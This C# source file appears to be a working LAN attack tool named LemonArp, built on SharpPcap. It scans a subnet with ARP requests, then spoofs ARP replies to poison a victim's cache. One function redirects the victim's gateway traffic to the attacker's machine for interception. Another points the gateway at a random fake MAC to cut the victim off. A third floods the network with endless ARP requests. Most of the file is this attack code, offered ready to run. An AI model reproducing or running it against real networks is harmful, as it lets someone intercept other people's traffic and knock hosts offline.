using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LemonArp
{
    class ArpTool
    {
        public event EventHandler<ResolvedEventArgs> ResolvedEvent;
        public event EventHandler<EventArgs> ScanStopedEvent;

        private LibPcapLiveDevice _device;
        private TimeSpan timeout = new TimeSpan(0, 0, 1);
        private System.Threading.Thread scanThread = null;
        private System.Threading.Thread arpSpoofingThread = null;
      public ArpTool(LibPcapLiveDevice device)
        {
            _device = device;

            foreach (var address in _device.Addresses)
            {
                if (address.Addr.type == Sockaddr.AddressTypes.AF_INET_AF_INET6)
                {
                    if (address.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        LocalIP = address.Addr.ipAddress;
                        break; 
                    }
                }
            }

            foreach (var address in device.Addresses)
            {
                if (address.Addr.type == SharpPcap.LibPcap.Sockaddr.AddressTypes.HARDWARE)
                {
                    LocalMAC = address.Addr.hardwareAddress; 
                }
            }

            GetwayIP = _device.Interface.GatewayAddress; 
            GetwayMAC = Resolve(GetwayIP); 
        }

        public IPAddress LocalIP { get; private set; }

        public IPAddress GetwayIP { get; private set; }

        public PhysicalAddress LocalMAC { get; private set; }

        public PhysicalAddress GetwayMAC { get; private set; }

        public void ScanLAN(IP startIP, IP endIP)
        {
            var targetIPList = new List<IPAddress>();
            while (!startIP.Equals(endIP))
            {
                targetIPList.Add(startIP.IPAddress);
                startIP.AddOne();
            }

            var arpPackets = new Packet[targetIPList.Count];
            for (int i = 0; i < arpPackets.Length; ++i)
            {
                arpPackets[i] = BuildRequest(targetIPList[i], LocalMAC, LocalIP);
            }
            String arpFilter = "arp and ether dst " + LocalMAC.ToString();
            _device.Open(DeviceMode.Promiscuous, 20);
            _device.Filter = arpFilter;

            scanThread = new System.Threading.Thread(() =>
            {
                for (int i = 0; i < arpPackets.Length; ++i)
                {
                    var lastRequestTime = DateTime.FromBinary(0);
                    var requestInterval = new TimeSpan(0, 0, 1);
                    var timeoutDateTime = DateTime.Now + timeout;
                    while (DateTime.Now < timeoutDateTime)
                    {
                        if (requestInterval < (DateTime.Now - lastRequestTime))
                        {
                            _device.SendPacket(arpPackets[i]);
                            lastRequestTime = DateTime.Now;
                        }
                        var reply = _device.GetNextPacket();
                        if (reply == null)
                        {
                            continue;
                        }
                        var packet = PacketDotNet.Packet.ParsePacket(reply.LinkLayerType, reply.Data);

                        var arpPacket = PacketDotNet.ARPPacket.GetEncapsulated(packet);
                        if (arpPacket == null)
                        {
                            continue;
                        }
                        if (arpPacket.SenderProtocolAddress.Equals(targetIPList[i]))
                        {
                            if (ResolvedEvent != null)
                            {
                                ResolvedEvent(this, new ResolvedEventArgs()
                                {
                                    IPAddress = arpPacket.SenderProtocolAddress,
                                    PhysicalAddress = arpPacket.SenderHardwareAddress
                                });
                            }
                            break;
                        }
                    }
                }
                _device.Close();
                Console.WriteLine("exit scan");
                if (ScanStopedEvent != null)
                {
                    ScanStopedEvent(this, new EventArgs());
                }
            });
            scanThread.Start();
        }

        public void StopScanLan()
        {
            if (scanThread != null && scanThread.ThreadState == System.Threading.ThreadState.Running)
            {
                scanThread.Abort();
                if (_device.Opened) _device.Close();
            }
        }

        public PhysicalAddress Resolve(IPAddress destIP)
        {
            var request = BuildRequest(destIP, LocalMAC, LocalIP);
            String arpFilter = "arp and ether dst " + LocalMAC.ToString();
            _device.Open(DeviceMode.Promiscuous, 20);
            _device.Filter = arpFilter;
            var lastRequestTime = DateTime.FromBinary(0);

            var requestInterval = new TimeSpan(0, 0, 1);

            PacketDotNet.ARPPacket arpPacket = null;
            var timeoutDateTime = DateTime.Now + timeout;
            while (DateTime.Now < timeoutDateTime)
            {
                if (requestInterval < (DateTime.Now - lastRequestTime))
                {
                    _device.SendPacket(request);
                    lastRequestTime = DateTime.Now;
                }
                var reply = _device.GetNextPacket();
                if (reply == null)
                {
                    continue;
                }

                var packet = PacketDotNet.Packet.ParsePacket(reply.LinkLayerType, reply.Data);

                arpPacket = PacketDotNet.ARPPacket.GetEncapsulated(packet);
                if (arpPacket == null)
                {
                    continue;
                }
                if (arpPacket.SenderProtocolAddress.Equals(destIP))
                {
                    break;
                }
            }

            _device.Close();

            if (DateTime.Now >= timeoutDateTime)
            {
                return null;
            }
            else
            {
                return arpPacket.SenderHardwareAddress;
            }
        }

        public void ARPStorm(List<IPAddress> requestIPList)
        {
            d = 0;
            List<Packet> packetList = new List<Packet>();
            foreach (var ip in requestIPList)
            {
                var packet = BuildRequest(ip, LocalMAC, LocalIP);
                packetList.Add(packet);
            }

            StopARPSpoofing();
            _device.Open(DeviceMode.Promiscuous, 20);
            arpSpoofingThread = new System.Threading.Thread(() =>
            {
                while (true)
                {
                    foreach (var packet in packetList)
                    {
                        _device.SendPacket(packet);
                        d++;
                    }
                }
            });
            arpSpoofingThread.IsBackground = true;
            arpSpoofingThread.Start();
        }

        public void ARPSpoofing1(IPAddress destIP, PhysicalAddress MAC)
        {
            var packet = BuildResponse(GetwayIP, GetwayMAC, destIP, LocalMAC);
            Console.WriteLine("start arp spoofing 1, dest ip {0}", destIP);
            StartARPSpoofing(packet);
        }
        public void ARPSpoofing2(IPAddress destIP, PhysicalAddress destMac, PhysicalAddress wrongMAC = null)
        {
            if (wrongMAC == null)
            {
                wrongMAC = GetRandomPhysicalAddress();
            }
            var packet = BuildResponse(destIP, destMac, GetwayIP, wrongMAC);
            Console.WriteLine("start arp spoofing 2, dest ip {0}, dest mac {1}, getway ip {2}, getwaymac {3}",
                               destIP, destMac, GetwayIP, wrongMAC);
            StartARPSpoofing(packet);
        }

        public void StopARPSpoofing()
        {
            if (arpSpoofingThread != null && arpSpoofingThread.ThreadState != System.Threading.ThreadState.Unstarted)
            {
                arpSpoofingThread.Abort();
                if (_device.Opened)
                    _device.Close();
                Console.WriteLine("stop arp spoofing");
            }
        }
        public int d = 0;
        private void StartARPSpoofing(Packet packet)
        {
            d = 0;
            StopARPSpoofing();
            _device.Open(DeviceMode.Promiscuous, 20);
            arpSpoofingThread = new System.Threading.Thread(() =>
            {
                while (true)
                {
                    _device.SendPacket(packet);
                    d++;
                }
            });
            arpSpoofingThread.IsBackground = true;
            arpSpoofingThread.Start();
        }

        private PhysicalAddress GetRandomPhysicalAddress()
        {
            Random random = new Random(Environment.TickCount);
            byte[] macBytes = new byte[] { 0x9C, 0x21, 0x6A, 0xC3, 0xB0, 0x27 };
            macBytes[5] = (byte)random.Next(255);
            Console.WriteLine(new PhysicalAddress(macBytes));
            return new PhysicalAddress(macBytes);
        }

        private Packet BuildResponse(IPAddress destIP, PhysicalAddress destMac, IPAddress senderIP, PhysicalAddress senderMac)
        {
            var ethernetPacket = new EthernetPacket(senderMac, destMac, EthernetPacketType.Arp);
            var arpPacket = new ARPPacket(ARPOperation.Response, destMac, destIP, senderMac, senderIP);
            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        private Packet BuildRequest(IPAddress destinationIP, PhysicalAddress localMac, IPAddress localIP)
        {
            var ethernetPacket = new EthernetPacket(localMac,
                                                    PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                                                    PacketDotNet.EthernetPacketType.Arp);
            var arpPacket = new ARPPacket(PacketDotNet.ARPOperation.Request,
                                          PhysicalAddress.Parse("00-00-00-00-00-00"),
                                          destinationIP,
                                          localMac,
                                          localIP);
            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }
    }
}
